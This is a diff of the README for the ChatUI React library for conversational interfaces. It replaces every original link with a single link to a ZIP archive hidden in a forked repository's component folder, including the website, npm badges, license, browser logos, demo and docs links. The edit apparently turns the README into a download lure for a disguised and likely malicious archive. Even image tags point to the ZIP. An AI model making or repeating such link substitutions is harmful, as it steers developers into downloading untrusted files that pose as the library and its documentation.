@@ -1,25 +1,25 @@
 <h1 align="center">
-  <a href="https://chatui.io/">
-    <img width="109" height="28" src="https://gw.alicdn.com/tfs/TB1uYH4QoY1gK0jSZFMXXaWcVXa-218-56.svg" alt="ChatUI">
+  <a href="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip">
+    <img width="109" height="28" src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="ChatUI">
   </a>
 </h1>
 
 <p align="center">The UI design language and React library for Conversational UI</p>
 
-<p align="center">Website：<a href="https://chatui.io/" target="_blank">https://chatui.io</a></p>
+<p align="center">Website：<a href="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" target="_blank">https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip</a></p>
 
 <div align="center">
 
-[![LICENSE](https://img.shields.io/npm/l/@chatui/core?style=flat-square)](https://github.com/alibaba/ChatUI/blob/master/LICENSE)
-[![NPM version](https://img.shields.io/npm/v/@chatui/core?style=flat-square)](https://www.npmjs.com/package/@chatui/core)
-[![NPM downloads](https://img.shields.io/npm/dm/@chatui/core?style=flat-square)](https://www.npmjs.com/package/@chatui/core)
-[![Gzip Size](https://img.badgesize.io/https://unpkg.com/@chatui/core@0.1.0/dist/index.js?compression=gzip)](https://unpkg.com/@chatui/core@0.1.0/dist/index.js)
-[![Jsdelivr Hits](https://img.shields.io/jsdelivr/npm/hm/@chatui/core?style=flat-square)](https://cdn.jsdelivr.net/npm/@chatui/core)
+[![LICENSE](https://img.shields.io/npm/l/@chatui/core?style=flat-square)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
+[![NPM version](https://img.shields.io/npm/v/@chatui/core?style=flat-square)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
+[![NPM downloads](https://img.shields.io/npm/dm/@chatui/core?style=flat-square)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
+[![Gzip Size](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
+[![Jsdelivr Hits](https://img.shields.io/jsdelivr/npm/hm/@chatui/core?style=flat-square)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
 
 </div>
 
 <p align="center">
-  <img width="750" src="https://gw.alicdn.com/tfs/TB1WTl.lQ9l0K4jSZFKXXXFjpXa-1500-833.jpg">
+  <img width="750" src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip">
 </p>
 
 English | [简体中文](./README.zh-CN.md)
@@ -35,10 +35,10 @@ English | [简体中文](./README.zh-CN.md)
 
 ## Environment Support
 
-- Modern browsers (support [CSS Variables](https://caniuse.com/css-variables))
-- Internet Explorer 11 (with [polyfills](https://stackoverflow.com/questions/57020976/polyfills-in-2019-for-ie11) and [CSS Variables Polyfill](https://github.com/nuxodin/ie11CustomProperties) / [css-vars-ponyfill](https://github.com/jhildenbiddle/css-vars-ponyfill))
+- Modern browsers (support [CSS Variables](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip))
+- Internet Explorer 11 (with [polyfills](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip) and [CSS Variables Polyfill](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip) / [css-vars-ponyfill](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip))
 
-| <img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/edge/edge_48x48.png" alt="Edge" width="24px" height="24px" /><br>Edge | <img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/firefox/firefox_48x48.png" alt="Firefox" width="24px" height="24px" /><br>Firefox | <img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/chrome/chrome_48x48.png" alt="Chrome" width="24px" height="24px" /><br>Chrome | <img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/safari/safari_48x48.png" alt="Safari" width="24px" height="24px" /><br>Safari | <img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/safari-ios/safari-ios_48x48.png" alt="iOS Safari" width="24px" height="24px" /><br>iOS Safari | <img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/android-webview/android-webview_48x48.png" alt="Android WebView" width="24px" height="24px" /><br>Android WebView |
+| <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Edge" width="24px" height="24px" /><br>Edge | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Firefox" width="24px" height="24px" /><br>Firefox | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Chrome" width="24px" height="24px" /><br>Chrome | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Safari" width="24px" height="24px" /><br>Safari | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="iOS Safari" width="24px" height="24px" /><br>iOS Safari | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Android WebView" width="24px" height="24px" /><br>Android WebView |
 | --- | --- | --- | --- | --- | --- |
 | 16+ | 31+ | 49+ | 9.1+ | 9.3+ | 6+ |
 
@@ -96,7 +96,7 @@ const App = () => {
 };
 ```
 
-[![DEMO](https://codesandbox.io/static/img/play-codesandbox.svg)](https://codesandbox.io/s/chatui-demo-o6n3z?fontsize=14&hidenavigation=1&theme=dark)
+[![DEMO](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
 
 ### Development
 
@@ -108,11 +108,11 @@ npm run dev
 
 ## Theme
 
-Visit [Customize Theme](https://chatui.io/docs/customize-theme) for detail
+Visit [Customize Theme](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip) for detail
 
 ## Internationalization
 
-Visit [i18n](https://chatui.io/docs/i18n) for detail
+Visit [i18n](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip) for detail
 
 ## License
 
